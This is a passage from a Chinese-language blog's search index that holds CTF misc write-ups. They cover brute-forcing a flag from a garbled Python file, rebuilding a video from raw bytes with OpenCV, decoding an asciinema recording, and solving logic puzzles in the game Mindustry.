print(str1)</span><br><span class="line">strs5.append(&#x27;tye9kxborszstguyd?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyde?!blm-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blme-p&#x27;)</span><br><span class="line">strs5.append(&#x27;ty9kxborszstguyd?!blm-pe&#x27;)</span><br><span class="line">print(strs5)</span><br><span class="line">print(len(strs5))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暴力即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># Th siz of th fil may reduc after XZRJification</span><br><span class="line"></span><br><span class="line">def check_equals(flag,left, right):</span><br><span class="line">    # check whether left == right or not</span><br><span class="line">    if left == right: print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(input_codes):</span><br><span class="line">    # retriev th decrypted data</span><br><span class="line"></span><br><span class="line">    output_chars = [cod_dict[c] for c in input_codes]</span><br><span class="line">    return &#x27;&#x27;.join(output_chars)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # check som obvious things</span><br><span class="line">    # check th flag</span><br><span class="line">    flags = []</span><br><span class="line">    for i in range(len(strs1)):</span><br><span class="line">        for j in range(len(strs2)):</span><br><span class="line">            for k in range(len(strs3)):</span><br><span class="line">                for d in range(len(strs4)):</span><br><span class="line">                    for m in range(len(strs5)):</span><br><span class="line">                        cod_dict = []</span><br><span class="line">                        cod_dict += strs1[i]</span><br><span class="line">                        cod_dict += strs2[j]</span><br><span class="line">                        cod_dict += strs3[k]</span><br><span class="line">                        cod_dict += strs4[d]</span><br><span class="line">                        cod_dict += strs5[m] </span><br><span class="line">                        tttttt = [53, 41, 85, 109, 75, 1, 33, 48, 77, 90,</span><br><span class="line">                                            17, 118, 36, 25, 13, 89, 90, 3, 63, 25,</span><br><span class="line">                                            31, 77, 27, 60, 3, 118, 24, 62, 54, 61,</span><br><span class="line">                                            25, 63, 77, 36, 5, 32, 60, 67, 113, 28]</span><br><span class="line">                        </span><br><span class="line">                        output_chars = [cod_dict[c] for c in tttttt]</span><br><span class="line">                        flag = &#x27;&#x27;.join(output_chars)</span><br><span class="line">                        </span><br><span class="line">                        if flag not in flags:</span><br><span class="line">                            if &#x27;flag&#123;&#x27; in flag and &#x27;&#125;&#x27; in flag:</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;flag&#123;&#x27;), 0)</span><br><span class="line">                                check_equals(flag,flag.index(&#x27;&#125;&#x27;), len(flag) - 1)</span><br><span class="line">                                flags.append(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;nou-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lovmr3d-7hm-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-rhght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3lover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-v&#125;-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br><span class="line">flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</span><br></pre></td></tr></table></figure><p>这里调后面的即可</p><h2 id="高频率星球"><a class="markdownIt-Anchor" href="#高频率星球">#</a> <strong>高频率星球</strong></h2><p>我还专门下载了 asciinema（只能再 linux 上使用），这题主要是解码 json 再删去记录的相应的操作字符即可，直接 python 提取 json 内容再转到 notepad++ 上替换操作字符串。</p><p>另外 windows 直接改后缀无法打开（菜我不知道为什么，还以为自己没替换好），必须在 linux 下 Node flag.js 才可。</p><h2 id="流式星球"><a class="markdownIt-Anchor" href="#流式星球">#</a> <strong>流式星球</strong></h2><p>这题先跟着视频如何转换为字节流的代码反向写一个字节流转换为视频的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def bin_to_video(bin_file, output_video, frame_width=1280, frame_height=640):</span><br><span class="line">   </span><br><span class="line">    buffer = np.fromfile(bin_file, dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    frame_count = len(buffer) // (frame_width * frame_height * 3)</span><br><span class="line"></span><br><span class="line">    reshaped_buffer = buffer[:frame_count * frame_width * frame_height * 3]</span><br><span class="line">    reshaped_buffer = reshaped_buffer.reshape((frame_count, frame_height, frame_width, 3))</span><br><span class="line"></span><br><span class="line">    fourcc = cv2.VideoWriter_fourcc(*&#x27;mp4v&#x27;)</span><br><span class="line">    out = cv2.VideoWriter(output_video, fourcc, 30.0, (frame_width, frame_height))</span><br><span class="line"></span><br><span class="line">    for i in range(frame_count):</span><br><span class="line">        out.write(reshaped_buffer[i])</span><br><span class="line"></span><br><span class="line">    out.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    bin_to_video(&quot;video.bin&quot;, &quot;deo.mp4&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现能模糊的看到 BangDream 几个字，之后去 B 站搜索了下，并找到相应的原视频（原视频为 360*640，改了一下 frame_width 和 frame_height，发现视频更加模糊），自己用题目给出的转化代码转换原视频，再自己手动测试，发现规律，在 frame_width 正确的情况下，frame_height 如何改变，视频只会出详上下移动的效果，而 frame_width 错误则视频极有可能十分模糊。直接上暴力，暴力 frame_width 直到找到正确的答案。似乎是 346. 之后就能得到清晰的视频</p><h2 id="异星歧途"><a class="markdownIt-Anchor" href="#异星歧途">#</a> <strong>异星歧途</strong></h2><p>主要是了解游戏机制，观看游戏里逻辑控制器的指令。第一个二进制序列很简单，照着打就行。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2.png?raw=true" alt="图片"><br>第二个指令需要进行运算，指令给出 sw1-8 组成了 number,number == fl0 时能够运行，fl0 只能为数的平方，且 SW1 = SW6 = 1，直接一步步试一下就行。 第三个指令序列需要看游戏机制，在满足反应堆冷却液充足的情况下打开传送带开关即可。第四个指令序列也要了解游戏机制中焚化炉的作用，合理关闭烧毁发电材料的焚化炉即可。（此游戏让我想到了异星工厂，另一款非常好的传送带工厂游戏）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/10/hello-world/"/>
      <url>/2023/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>This is the start!</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
